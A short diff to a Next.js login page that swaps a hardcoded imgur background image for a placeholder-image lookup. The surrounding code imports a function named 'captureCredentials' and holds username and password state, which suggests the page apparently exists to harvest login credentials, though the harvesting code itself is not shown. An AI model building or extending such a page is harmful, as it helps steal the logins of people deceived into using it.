@@ -2,12 +2,13 @@
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 import Link from 'next/link';
+import { PlaceHolderImages } from '@/lib/placeholder-images';
 
 // Make Swal available in the component
 declare const Swal: any;
 
 export default function Home() {
-  const imageUrl = "https://i.imgur.com/Kz8q2yT.png";
+  const imageUrl = PlaceHolderImages.find(p => p.id === 'login-background')?.imageUrl || "https://i.imgur.com/Kz8q2yT.png";
 
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
